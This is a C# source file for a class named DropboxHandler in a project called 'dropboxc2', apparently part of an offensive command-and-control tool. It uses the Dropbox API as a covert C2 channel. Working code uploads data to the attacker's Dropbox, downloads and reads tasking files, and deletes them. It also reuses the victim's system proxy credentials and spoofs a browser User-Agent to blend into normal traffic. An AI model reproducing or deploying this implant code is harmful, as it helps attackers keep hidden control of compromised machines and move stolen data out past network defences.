/*
Author: Arno0x0x, Twitter: @Arno0x0x
*/
using System;
using System.Net;
using System.Text;
using System.Collections;
using System.Web.Script.Serialization;

namespace dropboxc2
{
	//****************************************************************************************
    // Class handling all communications with the Dropbox server
    //****************************************************************************************
    class DropboxHandler
    {
        WebClient webClient; // WebClient object to communicate with the C2 server
        string accessToken; // Dropbox API access token
        string authorizationHeader;

        // List of Dropbox API URL entry points
        static Hashtable dropboxAPI = new Hashtable() {
            {"listFolder", "https://api.dropboxapi.com/2/files/list_folder" },
            {"move","https://api.dropboxapi.com/2/files/move" },
            {"uploadFile", "https://content.dropboxapi.com/2/files/upload" },
            {"downloadFile", "https://content.dropboxapi.com/2/files/download" },
            {"deleteFile", "https://api.dropboxapi.com/2/files/delete" },
            {"getMetaData", "https://api.dropboxapi.com/2/files/get_metadata" }
        };

        //--------------------------------------------------------------------------------------------------
        // Constructor method
        //--------------------------------------------------------------------------------------------------
        public DropboxHandler (string token)
        {
            accessToken = token;
            authorizationHeader = "Bearer " + accessToken;

            // Create a WebClient object to communicate with the C2 server
            webClient = new WebClient();

            //------------------------------------------------------------------
            // Check if an HTTP proxy is configured on the system, if so, use it
            
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Proxy = defaultProxy;
            }
            
            // Set the Authorization header used for all API requests
            webClient.Headers.Add("Authorization", authorizationHeader);
			
			// Set the User-Agent header used for all API requests
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
        }

        //--------------------------------------------------------------------------------------------------
        // Creates a file on the C2 server at the given path, containing the given bytes.
        // Returns the revision number for the file created.
        //--------------------------------------------------------------------------------------------------
        public string putFile (string path, byte[] data)
        {
            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.putFile] Uploading file...");
            #endif

            string command = @"{""path"": """ + path + @""",""mode"": ""overwrite"",""autorename"": false,""mute"": true}";
            string revNumber = String.Empty;

            webClient.Headers["Content-Type"] = "application/octet-stream";
            webClient.Headers["Dropbox-API-Arg"] = command;

            try
            {
                byte[] responseArray = webClient.UploadData((string)dropboxAPI["uploadFile"], data);

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic item = serializer.Deserialize<object>(Encoding.ASCII.GetString(responseArray));
                revNumber = item["rev"];
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return revNumber;
            }

            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.putFile] File upload DONE");
            #endif
            return revNumber;
        }

        //--------------------------------------------------------------------------------------------------
        // Returns the revision number of a file given in argument
        //--------------------------------------------------------------------------------------------------
        public string getRevNumber(string path)
        {
            string command = @"{""path"": """ + path + @""",""include_media_info"": false,""include_deleted"": false,""include_has_explicit_shared_members"": false}";
            string revNumber = String.Empty;

            webClient.Headers.Remove("Dropbox-API-Arg");
            webClient.Headers["Content-Type"] = "application/json";

            byte[] data = Encoding.ASCII.GetBytes(command);

            try
            {
                byte[] responseArray = webClient.UploadData((string)dropboxAPI["getMetaData"], data);

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic item = serializer.Deserialize<object>(Encoding.ASCII.GetString(responseArray));
                revNumber = item["rev"];
                return revNumber;
            }
            catch (Exception ex)
                {
                    #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return revNumber;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Returns true if no error occured, false otherwise
        //--------------------------------------------------------------------------------------------------
        public bool deleteFile(string path)
        {
            string command = @"{""path"": """ + path + @"""}";
            string revNumber = String.Empty;

            webClient.Headers.Remove("Dropbox-API-Arg");
            webClient.Headers["Content-Type"] = "application/json";

            byte[] data = Encoding.ASCII.GetBytes(command);

            try
            {
                webClient.UploadData((string)dropboxAPI["deleteFile"], data);
                return true;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return false;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Reads a remote file and return its content as a byte array
        //--------------------------------------------------------------------------------------------------
        public byte[] readFile(string path)
        {
            string command = @"{""path"": """ + path + @"""}";
            byte[] response = null;

            webClient.Headers.Remove("Content-Type");
            webClient.Headers["Dropbox-API-Arg"] = command;

            try
            {
                response = webClient.DownloadData((string)dropboxAPI["downloadFile"]);
                return response;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return response;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Downloads a remoteFile to a local one
        // Returns true if all went OK, false otherwise
        //--------------------------------------------------------------------------------------------------
        public bool downloadFile(string remoteFile, string localFile)
        {
            string command = @"{""path"": """ + remoteFile + @"""}";

            webClient.Headers.Remove("Content-Type");
            webClient.Headers["Dropbox-API-Arg"] = command;

            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.downloadFile] Downloading file...");
            #endif

            try
            {
                webClient.DownloadFile((string)dropboxAPI["downloadFile"], localFile);
                #if (DEBUG)
                    Console.WriteLine("\t\t[DropboxHandler.downloadFile] File downloaded");
                #endif
                return true;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return false;
            }
        }
    }
}